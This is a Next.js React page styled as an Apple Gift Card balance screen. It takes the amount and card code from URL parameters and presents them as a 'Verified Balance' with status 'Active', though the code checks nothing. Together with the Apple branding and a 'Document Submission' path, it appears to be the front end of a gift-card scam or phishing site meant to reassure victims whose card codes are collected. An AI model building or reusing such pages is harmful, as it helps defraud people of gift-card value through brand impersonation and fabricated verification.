'use client'

import { useSearchParams } from 'next/navigation'
import { Suspense, useEffect } from 'react'
import { useRouter } from 'next/navigation'

function BalanceContent() {
  const searchParams = useSearchParams()
  const router = useRouter()
  
  const type = searchParams.get('type') || 'auth'
  const amount = searchParams.get('amount')
  const cardCode = searchParams.get('code')

  // Redirect if no amount provided
  useEffect(() => {
    if (!amount) {
      router.push('/')
    }
  }, [amount, router])

  const maskCardNumber = (code: string | null) => {
    if (!code) return 'Not provided'
    if (code.length <= 3) return code
    return '*'.repeat(code.length - 3) + code.slice(-3)
  }

  const balance = amount ? `$${parseFloat(amount).toFixed(2)}` : '$0.00'
  const maskedCode = maskCardNumber(cardCode)
  const typeLabel = type === 'upload' ? 'Document Submission' : 'Verification'

  if (!amount) {
    return null // Will redirect via useEffect
  }

  return (
    <div className="min-h-screen flex flex-col">
      {/* Header */}
      <header className="fixed top-0 left-0 right-0 h-[52px] bg-white/90 backdrop-blur-xl border-b border-black/10 z-[1000] flex items-center">
        <div className="max-w-[1400px] mx-auto px-5 w-full flex items-center justify-between">
          <a href="/" className="text-[17px] font-[560] text-[#1d1d1f] no-underline">Apple Gift Card</a>
          <div className="flex items-center gap-3">
            <a href="#" className="text-[14px] font-semibold bg-[#0071e3] text-white px-4 py-1.5 rounded-full no-underline hover:bg-[#0077ed] transition">Buy</a>
          </div>
        </div>
      </header>

      {/* Main Content */}
      <main className="flex-1 flex flex-col pt-[52px]">
        <div className="flex flex-col items-center justify-center px-5 py-10 w-full max-w-[1200px] mx-auto min-h-[calc(100vh-52px)]">
          <div className="bg-white rounded-3xl p-12 w-full max-w-[560px] shadow-[0_12px_48px_rgba(0,0,0,0.08)] text-center">
            <div className="text-[64px] mb-6">✅</div>
            <h2 className="text-[28px] font-bold text-[#1d1d1f] mb-4">Your Balance</h2>
            
            <div className="text-[48px] font-bold text-[#0071e3] my-6">
              {balance}
            </div>
            
            <div className="bg-[#f5f5f7] rounded-xl p-4 my-4">
              <div className="text-[12px] text-[#6e6e73] uppercase tracking-[0.5px] mb-2">Card Number</div>
              <div className="text-[20px] font-semibold font-mono text-[#1d1d1f] tracking-[2px]">
                {maskedCode}
              </div>
            </div>
            
            <div className="bg-[#f5f5f7] rounded-xl p-4 my-6 text-[14px] text-[#1d1d1f]">
              <strong>Status:</strong> Active<br />
              <small className="text-[#8e8e93]">Verified Balance</small>
            </div>

            <div className="text-[16px] text-[#6e6e73] leading-relaxed my-6">
              <p>Your {typeLabel} has been processed successfully.</p>
              <p className="mt-4 text-[14px] text-[#8e8e93]">
                You can now use your balance for purchases on the Apple Store and other Apple services.
              </p>
            </div>
            
            <a
              href="/"
              className="inline-block text-[17px] font-semibold text-white bg-[#0071e3] no-underline px-8 py-3.5 rounded-full transition-all hover:bg-[#0077ed] hover:-translate-y-[1px] hover:shadow-[0_4px_12px_rgba(0,113,227,0.3)]"
            >
              Continue
            </a>
          </div>
        </div>
      </main>
    </div>
  )
}

export default function BalancePage() {
  return (
    <Suspense fallback={
      <div className="min-h-screen flex items-center justify-center">
        <div className="text-[#6e6e73]">Loading...</div>
      </div>
    }>
      <BalanceContent />
    </Suspense>
  )
}